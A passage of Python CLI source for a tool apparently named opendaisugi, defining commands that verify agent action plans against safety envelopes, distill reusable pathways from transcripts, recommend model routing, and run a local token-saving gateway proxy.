        plan = ActionPlan(**yaml.safe_load(plan_path.read_text()))
    except (yaml.YAMLError, ValueError) as e:
        _fail(
            f"Tried to read the plan {plan_path}.",
            f"It did not parse: {str(e).splitlines()[0]}",
            "Fix the file and run again.",
            code=2,
        )

    if yes:
        os.environ["DAISUGI_APPROVE"] = "always"

    if dry_run:
        typer.echo("Dry run — no real subprocesses will be spawned")

    if dry_run:
        dry = DryRunExecutor()
        executors = {
            "shell": dry,
            "file_read": dry,
            "file_write": dry,
            "network": dry,
        }
    else:
        executors = default_executors()
    approval = default_strategy()
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    supervisor = Supervisor(
        executors=executors,
        approval=approval,
        journal=journal,
    )

    try:
        session = asyncio.run(supervisor.run(plan, envelope))
    except KeyboardInterrupt:
        typer.echo("Aborted.", err=True)
        raise typer.Exit(code=130)

    if json_output:
        typer.echo(json.dumps(_serialize_session(session), indent=2, default=str))
    else:
        typer.echo(f"Run {session.id} ({session.status.value})")
        for outcome in session.steps:
            line = (
                f"  {outcome.step_id}: {outcome.status} "
                f"(rc={outcome.rc}, approved_by={outcome.approved_by}, "
                f"{outcome.duration_ms:.1f} ms)"
            )
            typer.echo(line)
            if outcome.error:
                typer.echo(f"      error: {outcome.error}")
            if outcome.stdout:
                for out_line in outcome.stdout.rstrip().splitlines()[:5]:
                    typer.echo(f"      {out_line}")
        if session.trace_id:
            typer.echo(f"Journal: {session.trace_id}")

    if session.status == RunStatus.SUCCEEDED:
        raise typer.Exit(code=0)
    if session.status == RunStatus.REJECTED:
        violations = session.verification.violations
        for v in violations:
            typer.echo(f"  {v.stage}: {v.message}", err=True)
        first = violations[0] if violations else None
        why = f"[{first.stage}] {first.message}" if first else "Verification rejected the plan."
        _fail(
            f"Tried to run the plan {plan_path}.",
            why,
            "Edit the plan or widen the envelope; see the violation above.",
            code=2,
        )
    if session.status == RunStatus.ABORTED:
        raise typer.Exit(code=130)
    raise typer.Exit(code=1)


_VALID_STAKES = {"low", "medium", "high"}
_VALID_THINKING_BUDGETS = {"light", "standard", "deep"}


@app.command("generate-envelope", hidden=True)
def generate_envelope_cmd(
    task: str = typer.Argument(..., help="Task description to envelope."),
    model: str = typer.Option(
        "anthropic/claude-sonnet-4-20250514",
        "--model",
        help="LLM model (litellm provider/model format).",
    ),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Root data directory. Unused by this command but accepted for consistency.",
    ),
    json_output: bool = typer.Option(False, "--json", help="Emit JSON instead of YAML."),
    stakes: str = typer.Option(
        "medium",
        "--stakes",
        help="Stakes level: low (uses default), medium (cache), high (always fresh).",
    ),
    low_stakes_envelope: Path | None = typer.Option(
        None,
        "--low-stakes-envelope",
        help="Path to a JSON Envelope file; used when --stakes low is set.",
    ),
    thinking_budget: str = typer.Option(
        "standard",
        "--thinking-budget",
        help="Thinking budget: light, standard, deep (mapped per provider).",
    ),
    llm: str | None = typer.Option(
        None,
        "--llm",
        help="LLM backend: litellm | claude-code. Default: auto-detect.",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
) -> None:
    """Generate a safety envelope for TASK via an LLM."""
    from opendaisugi.envelope import generate_envelope

    if llm is not None and llm not in {"litellm", "claude-code"}:
        typer.echo(
            f"Invalid --llm value {llm!r}. Must be 'litellm' or 'claude-code'.",
            err=True,
        )
        raise typer.Exit(code=2)
    if llm is not None:
        os.environ["OPENDAISUGI_LLM_BACKEND"] = llm
    if stakes not in _VALID_STAKES:
        typer.echo(
            f"Invalid --stakes value {stakes!r}. Must be one of: {', '.join(sorted(_VALID_STAKES))}",
            err=True,
        )
        raise typer.Exit(code=2)
    if thinking_budget not in _VALID_THINKING_BUDGETS:
        typer.echo(
            f"Invalid --thinking-budget value {thinking_budget!r}. "
            f"Must be one of: {', '.join(sorted(_VALID_THINKING_BUDGETS))}",
            err=True,
        )
        raise typer.Exit(code=2)
    _echo_resolved(data_dir)

    if stakes == "low" and low_stakes_envelope is not None:
        low_env: Envelope | None = Envelope.model_validate_json(low_stakes_envelope.read_text())
    elif stakes == "low":
        low_env = DEFAULT_LOW_STAKES_ENVELOPE
    else:
        low_env = None

    try:
        envelope = asyncio.run(
            generate_envelope(
                task=task,
                model=model,
                stakes=stakes,
                low_stakes_envelope=low_env,
                thinking_budget=thinking_budget,
            )
        )
    except TaskTooLongError as e:
        typer.echo(str(e), err=True)
        raise typer.Exit(code=2) from e
    except EnvelopeGenerationError as e:
        typer.echo(f"Envelope generation failed: {e}", err=True)
        raise typer.Exit(code=2) from e

    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
    if decompose:
        envelope = envelope.model_copy(
            update={
                "permissions": envelope.permissions.model_copy(
                    update={"shell_allow_decomposition": True}
                )
            }
        )
        _warn_if_decomposition_unusable(decompose)
    payload = envelope.model_dump(mode="json")
    if json_output:
        typer.echo(json.dumps(payload, indent=2))
    else:
        typer.echo(yaml.safe_dump(payload, sort_keys=False).rstrip())


@app.command("verify", hidden=True)
def verify_cmd(
    plan_path: Path = typer.Argument(
        ...,
        exists=True,
        dir_okay=False,
        readable=True,
        help="Path to a YAML file containing a serialized ActionPlan.",
    ),
    envelope_path: Path = typer.Option(
        ...,
        "--envelope",
        exists=True,
        dir_okay=False,
        readable=True,
        help="Path to a YAML file containing a serialized Envelope.",
    ),
    json_output: bool = typer.Option(False, "--json", help="Emit VerificationResult as JSON."),
) -> None:
    """Verify an action plan against a safety envelope."""
    from opendaisugi.verify import verify

    # plan_path/envelope_path are `typer.Argument(exists=True)`/`typer.Option(exists=True)`,
    # so Typer rejects a missing file before this body runs — only a parse failure
    # on an existing file is reachable here.
    try:
        plan = ActionPlan(**yaml.safe_load(plan_path.read_text()))
    except (yaml.YAMLError, ValueError) as e:
        _fail(
            f"Tried to verify the plan {plan_path}.",
            f"It did not parse: {str(e).splitlines()[0]}",
            "Fix the file and run again.",
            code=2,
        )
    try:
        envelope = Envelope(**yaml.safe_load(envelope_path.read_text()))
    except (yaml.YAMLError, ValueError) as e:
        _fail(
            f"Tried to verify against the envelope {envelope_path}.",
            f"It did not parse: {str(e).splitlines()[0]}",
            "Fix the file and run again.",
            code=2,
        )

    result = verify(plan, envelope)

    if json_output:
        typer.echo(json.dumps(result.model_dump(mode="json"), indent=2))
    else:
        status = "OK" if result.ok else "FAILED"
        typer.echo(f"Verification: {status}")
        typer.echo(f"  plan:     {result.plan_id}")
        typer.echo(f"  envelope: {result.envelope_id}")
        typer.echo(f"  duration: {result.duration_ms:.2f}ms")
        if result.violations:
            typer.echo("  violations:")
            for v in result.violations:
                typer.echo(f"    - [{v.stage}] {v.message}")
        if result.warnings:
            typer.echo("  warnings:")
            for w in result.warnings:
                typer.echo(f"    - {w}")

    raise typer.Exit(code=0 if result.ok else 1)


@app.command("tend", hidden=True)
def tend_cmd(
    data_dir: Path = typer.Option(
        Path.home() / ".opendaisugi",
        "--data-dir",
        help="Daisugi data directory.",
    ),
    model: str = typer.Option(
        "anthropic/claude-sonnet-4-20250514",
        "--model",
        help="Model used for template generalization + improvement.",
    ),
    min_traces: int = typer.Option(3, "--min-traces", help="Minimum cluster size to distill."),
    lookback_days: int = typer.Option(
        30, "--lookback-days", help="How far back to scan the journal."
    ),
    dry_run: bool = typer.Option(
        False, "--dry-run", help="Run the pipeline but do not store pathways."
    ),
) -> None:
    """Run the distiller. Scans successful traces and produces compiled pathways."""
    import asyncio

    from opendaisugi import Daisugi, console
    from opendaisugi.local_setup import load_configured_tier1

    tier1 = load_configured_tier1(data_dir)  # defer distillation LLM calls to a wired local model

    # Dry-run uses an in-memory SQLite so no bytes land in the user's data
    # dir; the pathway rows are discarded at process exit.
    if dry_run:
        from opendaisugi.pathway_store import PathwayStore

        dry_store = PathwayStore(":memory:")
        d = Daisugi(data_dir=data_dir, model=model, pathway_store=dry_store, tier1=tier1)
    else:
        d = Daisugi(data_dir=data_dir, model=model, pathway_store=True, tier1=tier1)

    with console.step("tending the garden"):
        report = asyncio.run(d.tend(min_traces=min_traces, lookback_days=lookback_days))
    typer.echo(
        f"tend complete: created={report.created} updated={report.updated} "
        f"skipped={report.skipped} in {report.duration_s:.1f}s"
    )
    if report.pathways:
        typer.echo(f"  {len(report.pathways)} pathway(s): {', '.join(report.pathways)}")
    for w in report.warnings:
        typer.echo(f"  warning: {w}")


@app.command("onboard", hidden=True)
def onboard_cmd(
    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
    model: str = typer.Option(
        "anthropic/claude-sonnet-4-20250514",
        "--model",
        help="Model for episode splitting + distillation (envelopes are inferred, no LLM).",
    ),
    llm: str | None = typer.Option(
        None,
        "--llm",
        help="LLM backend: litellm | claude-code. Default: auto-detect.",
    ),
    limit: int = typer.Option(None, "--limit", help="Process only the N most recent transcripts."),
    harness: list[str] = typer.Option(
        None,
        "--harness",
        help="Only process these harnesses (repeatable). Default: all discovered.",
    ),
    min_tools: int = typer.Option(
        3, "--min-tools", help="Merge episodes below this tool-call count."
    ),
    max_tools: int = typer.Option(
        30, "--max-tools", help="LLM-split episodes above this tool-call count."
    ),
    min_traces: int = typer.Option(
        3, "--min-traces", help="Minimum cluster size to distill a pathway."
    ),
    lookback_days: int = typer.Option(
        3650,
        "--lookback-days",
        help="How far back to scan ingested traces when distilling (default: all history).",
    ),
    threshold: float | None = typer.Option(
        None,
        "--threshold",
        help="Pathway clustering/retrieval similarity threshold (0-1); "
        "default: the active backend's (0.55 MiniLM / 0.59 potion / 0.25 lexical).",
    ),
    dry_run: bool = typer.Option(
        False,
        "--dry-run",
        help="Preview: discover and deterministically verify each episode "
        "(reports would-be pass/fail); makes NO model calls and writes no traces "
        "or pathways. Episodes large enough to need the LLM splitter are skipped.",
    ),
    allow_no_embedder: bool = typer.Option(
        False,
        "--allow-no-embedder",
        help="Onboard without the pathway embedder: builds the verified journal "
        "but distils NO token-saving pathways.",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Turn existing conversations into token-saving pathways — the day-one flow.

    Discovers your existing agent transcripts (Claude Code, Codex, ...), replays
    them into the verified journal, and distills reusable pathways so that from
    today matching tasks skip envelope generation (token savings) and every
    replayed action is verified (trust).
    """
    if llm is not None and llm not in {"litellm", "claude-code"}:
        typer.echo(f"Invalid --llm value {llm!r}. Must be 'litellm' or 'claude-code'.", err=True)
        raise typer.Exit(code=2)
    if llm is not None:
        os.environ["OPENDAISUGI_LLM_BACKEND"] = llm
    _echo_resolved(data_dir)

    # Pathway clustering IS the token-saving payoff, and it needs the embedder.
    # Without it a real onboard would spend model tokens on envelope generation
    # and distil zero pathways — so refuse up front (fail before spending), with
    # an explicit opt-out for the "I only want the verified journal" case. A
    # dry-run makes no calls, so it proceeds but says the payoff will be missing.
    import importlib.util

    if importlib.util.find_spec("sentence_transformers") is None:
        msg_install = "  Install it:  pip install 'opendaisugi[search]'"
        if dry_run:
            typer.echo(
                "note: the pathway embedder (sentence-transformers) is not installed — a "
                "real onboard would distil NO token-saving pathways.\n" + msg_install
            )
        elif not allow_no_embedder:
            typer.echo(
                "onboard needs the pathway embedder to turn traces into token-saving "
                "pathways, but 'sentence-transformers' is not installed. Without it this "
                "run would spend model tokens on envelope generation and distil ZERO "
                "pathways.\n" + msg_install + "\n"
                "  Or build only the verified journal (no pathways):  --allow-no-embedder",
                err=True,
            )
            raise typer.Exit(code=2)

    from opendaisugi import console
    from opendaisugi.ingest import ingest_episodes
    from opendaisugi.local_setup import load_configured_tier1
    from opendaisugi.onboarding import DiscoveredTranscript, onboard

    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
    from opendaisugi.journal import Journal

    journal = Journal(data_dir=data_dir)
    tier1 = load_configured_tier1(
        data_dir
    )  # defer distillation LLM calls to a qualified local model if wired

    # Content-addressed cache of LLM episode-split boundaries, so re-onboarding
    # the same transcripts doesn't re-pay the splitter. Skipped in dry-run: no
    # splitting happens there, and a dry run must not write to the data dir.
    from opendaisugi.parsers.claude_code import SPLIT_PROMPT_VERSION
    from opendaisugi.split_cache import SplitCache

    split_cache = (
        None
        if dry_run
        else SplitCache(data_dir / "split_cache.db", prompt_version=SPLIT_PROMPT_VERSION)
    )

    def parse_one(t: "DiscoveredTranscript"):
        # The harness id doubles as the parser format name (claude-code, ...).
        # A --dry-run must make ZERO model calls (it is "discover + report only").
        # The parser's LLM episode-splitter fires for any episode over max_tools
        # and runs before the dry-run gate, so lift the cap above any real episode
        # in dry-run to disable it — otherwise a "free" preview silently bills the
        # user for `claude -p` splitting calls across every large transcript.
        effective_max_tools = 10**9 if dry_run else max_tools
        try:
            parser = get_parser(
                t.harness,
                min_tools=min_tools,
                max_tools=effective_max_tools,
                model=model,
                split_cache=split_cache,
            )
        except ValueError:
            return None  # no parser registered for this harness — onboard skips + warns
        return parser.parse(t.path)

    async def ingest_one(parse_result):
        return await ingest_episodes(
            parse_result,
            journal,
            dry_run=dry_run,
            allow_shell_decomposition=decompose,
            # A dry-run can't LLM-split, so preview only episodes the real run
            # wouldn't split either (<= max_tools); larger ones are skipped, not
            # verified whole (which would give a misleading coarse verdict).
            preview_max_steps=max_tools if dry_run else None,
        )

    async def run_tend():
        from opendaisugi import Daisugi

        d = Daisugi(
            data_dir=data_dir,
            model=model,
            pathway_store=True,
            pathway_threshold=threshold,
            tier1=tier1,
        )
        return await d.tend(
            min_traces=min_traces,
            lookback_days=lookback_days,
            similarity_threshold=threshold,
        )

    report = asyncio.run(
        onboard(
            parse_one=parse_one,
            ingest_one=ingest_one,
            run_tend=run_tend,
            harnesses=list(harness) if harness else None,
            limit=limit,
            dry_run=dry_run,
            # stderr, not stdout: progress is not a result (clig.dev), and
            # console.note() is silenced under -q — typer.echo(..., err=False)
            # was neither.
            progress=None if json_output else console.note,
        )
    )

    if decompose:
        from opendaisugi.shell_decompose import parser_available

        if not parser_available():
            report.warnings.append(
                "shell decomposition is ON but the bash grammar isn't installed — every "
                "compound command was DENIED (fail-closed). Install it with: "
                "uv add 'opendaisugi[shell]'"
            )

    if json_output:
        typer.echo(json.dumps(report.__dict__, indent=2, default=str))
        return

    typer.echo("")
    by = ", ".join(f"{k}: {v}" for k, v in sorted(report.by_harness.items())) or "—"
    typer.echo(
        f"Discovered {report.transcripts_found} transcript(s); "
        f"processed {report.transcripts_processed} ({by})."
    )
    if dry_run:
        previewed = report.traces_passed + report.traces_failed
        typer.echo("Preview — deterministic verify, no model calls, nothing written:")
        typer.echo(
            f"  {previewed} episode(s) previewed: {report.traces_passed} would verify, "
            f"{report.traces_failed} would fail"
            + (f"; {report.traces_skipped} already present" if report.traces_skipped else "")
        )
        if report.traces_preview_skipped:
            # These are excluded from the pass/fail above, so that pair is a
            # verdict on a SUBSET, not the whole corpus — say so plainly.
            typer.echo(
                f"  {report.traces_preview_skipped} more episode(s) too large to preview here — a "
                f"real onboard LLM-splits each into sub-episodes (which mostly verify), so the "
                f"counts above cover only the {previewed} that don't need splitting."
            )
        if not decompose and report.traces_failed:
            typer.echo(
                "  tip: many failures are compound shells (a && b) rejected without "
                "decomposition — add --allow-shell-decomposition to preview them as they'd run."
            )
        typer.echo("Dry run — re-run without --dry-run to journal + distill.")
    else:
        typer.echo(
            f"Journal: {report.traces_passed} verified, {report.traces_failed} failed, "
            f"{report.traces_skipped} already present."
        )
        typer.echo(f"Pathways: {report.pathways_created} new, {report.pathways_updated} updated.")
        if report.pathways_created or report.pathways_updated:
            typer.echo(
                "  → Token routing is live: matching tasks now skip envelope generation (Tier-0)."
            )
        typer.echo(
            f"  → Trust: replay any action with `daisugi journal replay <id>`; "
            f"journal at {data_dir / 'journal'}."
        )
    for w in report.warnings:
        typer.echo(f"  warning: {w}")


@app.command("route", hidden=True)
def route_cmd(
    task: str = typer.Argument(..., help="The task to get a routing recommendation for."),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory (pathway store)."
    ),
    cheap_model: str = typer.Option(
        "claude-haiku-4-5", "--cheap-model", help="Model recommended for easy tasks."
    ),
    frontier_model: str = typer.Option(
        "claude-opus-4-8", "--frontier-model", help="Model recommended for hard tasks."
    ),
    threshold: float | None = typer.Option(
        None, "--threshold", help="Pathway-match threshold (0-1); default: active backend's."
    ),
    harness: str = typer.Option(
        "claude-code",
        "--harness",
        help="Host harness: claude-code, codex, ollama/local, hermes, openclaw. "
        "The Anthropic advisor-tool pairing is only suggested on Claude/Anthropic harnesses.",
    ),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Recommend the cheapest viable model/tier for a task.

    A repeat task that matches a distilled pathway routes to Tier-0 (reuse —
    near-free and re-verified); an easy novel task to a cheap model; a hard novel
    task to the frontier (or, on a Claude/Anthropic harness, the advisor-tool pairing).
    """
    from opendaisugi.pathway_store import PathwayStore
    from opendaisugi.routing import RouteAdvisor, advisor_tool_available_for_harness

    db = data_dir / "pathways.db"
    store = PathwayStore(db) if db.exists() else None
    advisor = RouteAdvisor(
        pathway_store=store,
        cheap_model=cheap_model,
        frontier_model=frontier_model,
        threshold=threshold,
        advisor_tool_available=advisor_tool_available_for_harness(harness),
    )
    advice = advisor.advise(task)

    if json_output:
        typer.echo(json.dumps(advice.__dict__, indent=2))
        return

    typer.echo(f"route: {advice.tier}" + (f"  →  {advice.model}" if advice.model else ""))
    typer.echo(f"  difficulty: {advice.difficulty:.2f}")
    if advice.pathway_id:
        typer.echo(f"  pathway:    {advice.pathway_id}")
    typer.echo(f"  why:        {advice.reason}")


@app.command("gateway", hidden=True)
def gateway_cmd(
    host: str = typer.Option("127.0.0.1", "--host", help="Bind address."),
    port: int = typer.Option(8787, "--port", help="Bind port."),
    upstream: str = typer.Option(
        "https://api.anthropic.com",
        "--upstream",
        help="Where saved turns go: a raw provider (replace) or a NeMo Switchyard endpoint "
        "(compose — it does trained routing, we add reuse + the journal on top).",
    ),
    cheap_model: str = typer.Option(
        "claude-haiku-4-5", "--cheap-model", help="Model an easy turn is routed onto."
    ),
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory (holds the turn journal)."
    ),
    capture_answers: bool = typer.Option(
        False,
        "--capture-answers/--no-capture-answers",
        help="Persist each turn's raw response text to <data-dir>/gateway/answers.jsonl (a "
        "bounded ring) for freshness-gated reuse. Opt-in and off by default — this is the "
        "one place the gateway retains response content, so leave it off unless you want "
        "that reuse.",
    ),
    local_model: str = typer.Option(
        None,
        "--local-model",
        help="A qualified local model id (ADR-0015): easy turns take this rung ahead of "
        "any cloud downgrade — zero quota, and cache stickiness never blocks it. "
        "Defaults to gateway_local_model from config.yaml.",
    ),
    openai_upstream: str = typer.Option(
        "https://api.openai.com",
        "--openai-upstream",
        help="Upstream for OpenAI-wire requests (…/chat/completions — Codex and every "
        "OpenAI-wire agent).",
    ),
    openai_cheap_model: str = typer.Option(
        "gpt-5-mini",
        "--openai-cheap-model",
        help="Model an easy OpenAI-wire turn is routed onto (must be a model the OpenAI "
        "upstream serves). Empty string disables routing on that wire (pure passthrough).",
    ),
    upstream_kind: str = typer.Option(
        None,
        "--upstream-kind",
        help="The wire --upstream speaks: anthropic for the real API, or ollama, "
        "openai-compatible, or anthropic-compatible for a self-hosted host. Defaults to "
        "the kind `daisugi tiers setup --remote` recorded for the host, but only when "
        "--upstream still points at that same recorded host. Any other --upstream, the default real "
        "Anthropic API included, defaults to anthropic. A non-anthropic kind makes the "
        "gateway answer Claude Code's count_tokens preflight itself instead of forwarding "
        "it. Most self-hosted servers do not implement that route.",
    ),
    router: str = typer.Option(
        None,
        "--router",
        help="Who picks the model for each turn: rules, the built-in heuristic; "
        "switchyard, NVIDIA NeMo Switchyard started as a managed child on loopback, which "
        "replaces --upstream; or off, which forwards each turn unchanged and only meters "
        "it. Defaults to gateway_router in config.yaml.",
    ),
    switchyard_config: Path = typer.Option(
        None,
        "--switchyard-config",
        help="Your own Switchyard TOML file. The gateway leaves it as it is and reads the "
        "two tiers of the route switchyard_route_id from it. Without it, the gateway "
        "writes <data-dir>/switchyard.toml from config.yaml on each start.",
    ),
    switchyard_port: int = typer.Option(
        4000, "--switchyard-port", help="The loopback port of the managed switchyard-server."
    ),
) -> None:
    """Run the token-saving gateway: a local proxy any harness points at via base_url.

    It forwards each whole agent turn to the provider, first routing an easy turn onto the
    cheap model (never overriding a hard turn) and journalling what that saved. It fails open
    — if it can't route or the cheap model rejects a turn, the original goes through untouched,
    so you lose savings, never the turn. Point a harness at it, e.g.::

        ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude

    The same proxy speaks the OpenAI wire on …/chat/completions, so Codex points at it too
    (config.toml model_providers base_url = "http://127.0.0.1:8787/v1", wire_api = "chat").

    The Anthropic wire follows config.yaml while it runs: a change to the file, a SIGHUP,
    or a loopback POST /_reload rebuilds the router for the next turn. A --local-model flag
    outranks the file for the life of the process. The OpenAI wire does not reload; its
    cheap model is the --openai-cheap-model flag.

    With --router switchyard the gateway starts switchyard-server on loopback,
    sends each Anthropic-wire turn to its route, and journals the target that
    served it. It stops the child when it exits. The router choice is read
    once at start; a change to gateway_router needs a restart.
    """
    from opendaisugi.config import load_config
    from opendaisugi.gateway_asgi import serve_gateway
    from opendaisugi.model_host import UPSTREAM_KINDS, upstream_kind_for_recorded_host

    if router is None:
        router = load_config(data_dir / "config.yaml").gateway_router
    if router not in _ROUTERS:
        _fail(
            f"unknown --router {router!r}.",
            "the gateway knows three choosers.",
            f"choose one of: {', '.join(_ROUTERS)}",
            code=1,
        )

    # The flag stays None here so the file rung stays live: serve_gateway
    # re-reads gateway_local_model on every config change, and a flag given
    # here outranks the file for the life of the process.
    shown_local_model = local_model or load_config(data_dir / "config.yaml").gateway_local_model
    if upstream_kind is not None and upstream_kind not in UPSTREAM_KINDS:
        _fail(
            f"unknown --upstream-kind {upstream_kind!r}.",
            "the gateway only knows the wires it can shim count_tokens for.",
            f"choose one of: {', '.join(UPSTREAM_KINDS)}",
            code=1,
        )
    if upstream_kind is None:
        # Trust the recorded kind only when --upstream names that same host.
        # A stale recording plus the default, the real Anthropic API, must
        # never make this gateway shim a real, working count_tokens call.
        # A recorded host is self-hosted whatever wire it speaks, so its
        # kind maps onto the shim's vocabulary and never onto "anthropic".
        cfg = load_config()
        upstream_kind = (
            upstream_kind_for_recorded_host(cfg.llm_host_kind)
            if cfg.llm_base_url
            and cfg.llm_host_kind
            and upstream.rstrip("/") == cfg.llm_base_url.rstrip("/")
            else "anthropic"
        )
    router_mode = {"rules": "rules", "switchyard": "external", "off": "off"}[router]
    external = None
    switchyard_child = None
    if router == "switchyard":
        external, upstream, switchyard_child = _start_switchyard_for_gateway(
            data_dir, switchyard_config, switchyard_port
        )
        # Switchyard serves /v1/messages/count_tokens through the route, so
        # the gateway forwards it instead of answering it.
        upstream_kind = "anthropic"
    typer.echo(f"opendaisugi gateway  →  {upstream}")
    typer.echo(f"  router: {router}")
    if shown_local_model and router == "rules":
        typer.echo(f"  local rung: easy turns go to {shown_local_model}")
    typer.echo(f"  listening on http://{host}:{port}  (journal: {data_dir}/gateway/turns.jsonl)")
    typer.echo(
        f"  config reload: on change to {data_dir}/config.yaml, on SIGHUP, "
        f"or POST http://{host}:{port}/_reload from this machine"
    )
    typer.echo(f"  point your harness at it:  ANTHROPIC_BASE_URL=http://{host}:{port}")
    if openai_cheap_model:
        typer.echo(
            f"  OpenAI wire: …/chat/completions → {openai_upstream} "
            f"(easy turns → {openai_cheap_model})"
        )
    if capture_answers:
        typer.echo(f"  capturing answers to:      {data_dir}/gateway/answers.jsonl")
    try:
        serve_gateway(
            host=host,
            port=port,
            upstream_base_url=upstream,
            upstream_kind=upstream_kind,
            data_dir=data_dir,
            local_model=local_model,
            cheap_model=cheap_model,
            capture_answers=capture_answers,
            openai_upstream_base_url=openai_upstream,
            openai_cheap_model=openai_cheap_model or None,
            router_mode=router_mode,
            external=external,
        )
    finally:
        if switchyard_child is not None:
            from opendaisugi.router_switchyard import stop_own_child

            handle, state_path = switchyard_child
            typer.echo(f"  switchyard: {stop_own_child(handle, state_path, wait_s=5.0)}")


_ROUTERS = ("rules", "switchyard", "off")


def _start_switchyard_for_gateway(data_dir: Path, own_config: Path | None, port: int):
    """Start the managed child for `daisugi gateway --router switchyard`.

    Returns (ExternalRouterConfig, upstream URL, (handle, state file path)). Every
    failure exits: a missing binary or a child that will not answer with 3,
    a config it cannot meter with 1. The gateway never runs in switchyard
    mode without a healthy child and a target pair to meter by.
    """
    from opendaisugi.config import load_config
    from opendaisugi.gateway_pipeline import ExternalRouterConfig
    from opendaisugi.router_switchyard import (
        SwitchyardConfigError,
        check_prerequisite,
        child_files_for,
        client_auth_from_toml,
        client_auth_modes,
        locate_binary,
        render_switchyard_toml,
        route_targets_from_toml,
        start_switchyard,
        state_path_for,
        targets_from_config,
        write_switchyard_config,
    )

    problem = check_prerequisite()
    if problem:
        typer.echo(problem, err=True)
        raise typer.Exit(code=3)
    cfg = load_config(data_dir / "config.yaml")
    prices: dict[str, tuple[float, float]] = {}
    # The child loads its own per-port copy, so a later install or another
    # gateway cannot change what it runs or who it bills.
    files = child_files_for(data_dir, port)
    copy_name = files["config"].name
    if own_config is not None:
        try:
            own_text = Path(own_config).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            _fail(
                f"cannot read {own_config}: {exc}",
                "the gateway copies your Switchyard config before it starts the child.",
                "check the path you gave to --switchyard-config.",
                code=1,
            )
        config_path = write_switchyard_config(files["config"].parent, own_text, name=copy_name)
        auth = None
    else:
        targets = targets_from_config(cfg)
        if targets is None:
            _fail(
                "no efficient model is set for Switchyard.",
                "the stage router needs a cheaper tier to choose.",
                "run: daisugi install --gateway --router switchyard --efficient-model <id>",
                code=1,
            )
        try:
            text = render_switchyard_toml(targets, route_id=cfg.switchyard_route_id)
        except ValueError as exc:
            _fail(
                f"cannot write the Switchyard config: {exc}",
                "the values in config.yaml do not make a valid route.",
                "fix switchyard_* in config.yaml, or run daisugi install again.",
                code=1,
            )
        config_path = write_switchyard_config(files["config"].parent, text, name=copy_name)
        auth = client_auth_modes(targets)
        if targets.efficient_local:
            # A local model spends no provider quota and no dollars.
            prices[targets.efficient_id] = (0.0, 0.0)
    try:
        capable, efficient = route_targets_from_toml(config_path, cfg.switchyard_route_id)
    except SwitchyardConfigError as exc:
        _fail(
            f"cannot meter this Switchyard config: {exc}",
            "the gateway books each turn by the two tiers of the route it sends.",
            "name a stage_router route with id switchyard_route_id, or pass a "
            "--switchyard-config that has one.",
            code=1,
        )
    if auth is None:
        auth = client_auth_from_toml(config_path, cfg.switchyard_route_id)
    state_path = state_path_for(data_dir, port)
    handle, msg = start_switchyard(
        config_path,
        port=port,
        binary=locate_binary(),
        routing_log_path=files["routing_log"],
        log_path=files["log"],
        state_path=state_path,
        route_id=cfg.switchyard_route_id,
        auth=auth,
    )
    typer.echo(f"  switchyard: {msg}")
    if handle is None:
        raise typer.Exit(code=3)
    typer.echo(f"  switchyard config: {config_path}")
    typer.echo(f"  capable tier: {capable}   efficient tier: {efficient}")
    if auth is not None:
        typer.echo(f"  capable auth: {auth['capable']}")
        typer.echo(f"  efficient auth: {auth['efficient']}")
    external = ExternalRouterConfig(
        route_id=cfg.switchyard_route_id,
        capable_target=capable,
        efficient_target=efficient,
        prices=prices,
    )
    return external, handle.base_url, (handle, state_path)


@app.command("distill-repeats", hidden=True)
def distill_repeats_cmd(
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Daisugi data directory (reads <data-dir>/gateway/turns.jsonl).",
    ),
    top: int = typer.Option(20, "--top", help="Maximum number of rows to print."),
) -> None:
    """Rank repeated gateway asks into a reuse worklist — the frontier spend, ranked.

    Reads the gateway turn journal, clusters repeated asks by embedding similarity
    (paraphrases included), and prints the clusters ranked by the frontier tokens
    they've collectively cost — the biggest, most-repeated asks are exactly the
    ones worth turning into a reusable pathway first. Tokens first, dollars
    alongside. LLM-free: this only aggregates journal numbers and, per cluster,
    does one read-only pathway-store lookup to flag a repeat that's already
    reusable. It never mints a pathway.
    """
    from opendaisugi.gateway_distill import rank_reuse_candidates
    from opendaisugi.gateway_journal import GatewayJournal
    from opendaisugi.pathway_store import PathwayStore

    journal_path = data_dir / "gateway" / "turns.jsonl"
    records = GatewayJournal(path=journal_path).load()
    if not records:
        typer.echo("no turns recorded yet — run `daisugi gateway` to start journaling.")
        return

    db = data_dir / "pathways.db"
    pathway_store = PathwayStore(db) if db.exists() else None

    try:
        candidates = rank_reuse_candidates(records, pathway_store=pathway_store)
    except ImportError as e:
        typer.echo(str(e), err=True)
        raise typer.Exit(code=2)

    if not candidates:
        typer.echo("no repeated asks found yet.")
        return

    typer.echo(f"{'rank':>4}  {'occ':>4}  {'tokens':>10}  {'dollars':>9}  reusable?  task")
    for i, c in enumerate(candidates[:top], start=1):
        task_display = " ".join(c.cluster.representative_task.split())
        if len(task_display) > 70:
            task_display = task_display[:67] + "..."
        reusable = "yes" if c.already_reusable else "no"
        typer.echo(
            f"{i:>4}  {c.cluster.count:>4}  {c.total_tokens:>10,}  "
            f"${c.total_dollars:>8.2f}  {reusable:>9}  {task_display}"
        )


@app.command("gateway-report", hidden=True)
def gateway_report_cmd(
    data_dir: Path = typer.Option(
        DEFAULT_DATA_DIR,
        "--data-dir",
        help="Daisugi data directory (reads <data-dir>/gateway/turns.jsonl).",
    ),
) -> None:
    """Calibrate the gateway on a real recorded day: realized routing + potential reuse.

    Reads the gateway turn journal and prints three clearly-separated sections: what
    routing has ALREADY saved (measured, straight off the journal), what repeat-driven
